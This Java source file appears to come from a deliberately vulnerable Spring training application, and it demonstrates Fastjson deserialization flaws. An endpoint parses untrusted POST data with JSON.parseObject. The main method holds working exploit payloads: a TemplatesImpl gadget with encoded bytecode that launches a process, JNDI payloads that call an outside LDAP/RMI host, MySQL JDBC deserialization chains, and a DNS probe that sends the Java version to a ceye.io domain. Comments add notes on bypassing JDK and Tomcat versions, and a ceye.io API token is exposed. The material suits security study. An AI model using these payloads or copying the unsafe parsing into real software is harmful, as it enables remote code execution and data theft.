package org.joychou.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;


@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "")
    @ResponseBody
    public String index() {
        try {
            return JSON.VERSION;
        } catch (Exception e) {
            return e.toString();
        }
    }

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString() + JSONObject.VERSION;
        } catch (Exception e) {
            return e.toString();
        }
    }

    public static void main(String[] args) {
        // 1.2.24 payload
        // open -a Calculator
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
        payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.88.0.3:50389/0dae16\", \"autoCommit\":true}";
        // JNDIBasicPayload	最基础漏洞利用姿势，可远程加载，推荐使用LDAP，可利用的JDK版本覆盖比RMI的广	JDK < 8u191	LDAP、RMI
        // JNDIResourceRefPayload jdk 251版本ldap和rmi都成功tomcat bypass
        // JNDIResourceRefPayload	基于ObjectFactory的利用，通过 Tomcat BeanFactory 类实现漏洞利用	大部分Tomcat版本: tomcat8 < 8.5.79 tomcat9 < 9.0.63 tomcat10 < 10.0.21 tomcat10.1 < 10.1.0-M14	LDAP、RMI
        // JNDIRMIDeserializePayload jdk 251版本ldap和rmi都失败
        // JNDIRMIDeserializePayload	RMI 反序列化	全JDK版本	RMI
        // payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://10.88.0.3:50388/1bc684\", \"autoCommit\":true}";

        // 1.2.80 mysql payload
        // payload = "{\"@type\":\"com.mysql.jdbc.CompressedInputStream\",\"conn\":{\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"10.88.0.3\",\"portToConnectTo\":3308,\"info\":{\"user\":\"yso_CommonsCollections4_calc\",\"password\":\"inmima\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"NUM_HOSTS\":\"1\"},\"databaseToConnectTo\":\"dbname\"}}";
        // payload = "{\"@type\":\"java.io.InputStream\",\"@type\":\"com.mysql.jdbc.CompressedInputStream\",\"conn\":{\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"10.88.0.3\",\"portToConnectTo\":3308,\"info\":{\"user\":\"f741b6\",\"password\":\"pass\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"NUM_HOSTS\":\"1\"},\"databaseToConnectTo\":\"dbname\"}}";

        // http://api.ceye.io/v1/records?token=c68b7d217125ccc335cdcb100bce6453&type=dns
        // http://api.ceye.io/v1/records?token=c68b7d217125ccc335cdcb100bce6453&type=request
        // payload = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"ldap://${java.version}.72568b.ceye.io\"}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
